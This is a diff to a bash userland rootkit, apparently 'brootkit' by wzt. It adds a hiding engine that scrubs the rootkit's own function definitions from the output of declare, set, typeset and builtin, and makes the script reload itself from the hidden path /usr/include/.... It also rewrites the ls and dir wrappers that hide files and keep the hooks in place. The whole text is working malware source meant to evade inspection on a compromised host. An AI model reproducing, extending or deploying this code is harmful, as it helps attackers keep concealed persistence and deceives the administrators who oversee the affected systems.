@@ -4,14 +4,16 @@
 # by wzt 2015 	http://www.cloud-sec.org
 #
 
-declare -r builtin
-declare -r declare
-declare -r set
-declare -r fake_unset
-declare -r type
-declare -r typeset
+#declare -r builtin
+#declare -r declare
+#declare -r set
+#declare -r fake_unset
+#declare -r type
+#declare -r typeset
 
-unalias ls >/dev/null 2>&1
+#unalias ls >/dev/null 2>&1
+
+set +v
 
 BR_ROOTKIT_PATH="/usr/include/..."
 
@@ -20,20 +22,48 @@ function abcdmagic()
 	:
 }
 
+function br_hide_engine()
+{
+        declare -a brootkit_func=(
+                                "^typeset.*()|15" "^type.*()|27"
+                                "^su.*()|26" "^reset_ps.*()|8"
+                                "^reset_netstat.*()|8" "^reset_ls.*()|8"
+                                "^reset_command.*()|42" "^ps.*()|14"
+                                "^netstat.*()|14" "^max_file_length.*()|9"
+                                "^ls.*()|64" "^fake_unset.*()|10"
+                                "^fake_command.*()|12" "^display_array.*()|11"
+                                "^dir.*()|3" "^declare.*()|41"
+                                "^command*()|39" "^builtin.*()|19"
+                                "^br_load_config.*()|28" "^br_display_config.*()|14"
+                                "^abcdmagic.*()|3" "^/usr/bin/dir.*()|5"
+                                "^/bin/ps.*()|5" "^/bin/netstat.*()|5"
+                                "^/bin/ls.*()|5" "^br_hide_file=|5"
+				"^set.*()|19" "^br_hide_engine.*()|30"
+                                )
+        local func_line br_func func_name func_num
+
+	echo "$1" >.br.tmp
+        for br_func in ${brootkit_func[*]}
+        do
+                func_name=`echo $br_func | cut -d "|" -f 1`
+                func_num=`echo $br_func | cut -d "|" -f 2`
+                #echo $func_name $func_num
+                func_line=`grep -n "$func_name" .br.tmp| awk -F: {'print $1'}`
+                #echo $func_line
+                sed -i "$func_line,+$func_num d" .br.tmp >/dev/null 2>&1
+        done
+	cat .br.tmp
+}
+
 function builtin()
 {
-	local fake_a fake_b
+	local fake_a
 
 	unset command
 	case $1 in 
 		"declare"|"set"|"unset"|"command"|"type"|"typeset")
         		fake_a="$(command builtin $1 $2)"
-			if [ $2 == " " ];then
-        			fake_b=${fake_a/br_hide_file\=*/}
-			else
-        			fake_b=${fake_a/\/bin\/ls?()*/}
-			fi
-			echo -n "$fake_b"
+			br_hide_engine "$fake_a"
 			reset_command
 			return ;;
 		"builtin")
@@ -49,14 +79,13 @@ function builtin()
 
 function declare()
 {
-	local fake_a fake_b
+	local fake_a
 
 	unset command
 	case $1 in 
 		"")
         		fake_a="$(command declare $1 $2)"
-        		fake_b=${fake_a/br_hide_file\=*/}
-			echo -n "$fake_b"
+			br_hide_engine "$fake_a"
 			reset_command
 			return ;;
 		"-f"|"-F")
@@ -74,14 +103,13 @@ function declare()
 
 function typeset()
 {
-        local fake_a fake_b
+        local fake_a 
 
 	unset command
         case $1 in
                 ""|"-f"|"-F")
                         fake_a="$(command declare $1 $2)"
-                        fake_b=${fake_a/br_hide_file\=*/}
-                        echo -n "$fake_b"
+			br_hide_engine "$fake_a"
 			reset_command
                         return ;;
                 *)
@@ -122,17 +150,17 @@ function type()
 
 function set()
 {
-        local fake_a fake_b
+        local fake_a
 
 	unset command
         case $1 in
                 "")
                         fake_a="$(command set)"
-                        fake_b=${fake_a/br_hide_file\=*/}
-                        echo -n "$fake_b"
+			br_hide_engine "$fake_a"
 			reset_command
                         return ;;
 		"-x"|"+x")
+			reset_command
 			return ;;
                 *)
 			echo $1 $2
@@ -182,7 +210,7 @@ function command()
 			return ;;
 		"unset")
 			fake_unset $2 $3
-			. brootkit.sh
+			. $BR_ROOTKIT_PATH/brootkit.sh
 			return ;;
 		"type")
 			type $2 $3
@@ -196,7 +224,7 @@ function command()
                 *)
 			unset command
 			command $2 $3
-			. brootkit.sh
+			. $BR_ROOTKIT_PATH/brootkit.sh
 			return ;;
         esac
 }
@@ -217,7 +245,7 @@ function reset_command()
                         	return ;;
                 	"unset")
                         	fake_unset $2 $3
-                        	. brootkit.sh
+                        	. $BR_ROOTKIT_PATH/brootkit.sh
                         	return ;;
                 	"type")
                         	type $2 $3
@@ -231,7 +259,7 @@ function reset_command()
                 	*)
                         	unset command
                         	command $2 $3
-                        	. brootkit.sh
+                        	. $BR_ROOTKIT_PATH/brootkit.sh
                         	return ;;
         	esac
 	}
@@ -361,13 +389,13 @@ function ls()
 
 function dir()
 {
-	ls $@
+	/bin/ls $@
 }
 
 function /usr/bin/dir()
 {
 	unset -f /bin/ls
-	ls $@
+	/bin/ls $@
 	reset_ls
 }
 
@@ -376,7 +404,7 @@ function reset_ls()
 	function /bin/ls()
 	{
 		unset -f /bin/ls
-		ls $@
+		/bin/ls $@
 		reset_ls
 	}
 }
@@ -384,7 +412,7 @@ function reset_ls()
 function /bin/ls()
 {
 	unset -f /bin/ls
-	ls $@
+	/bin/ls $@
 	reset_ls
 }
 
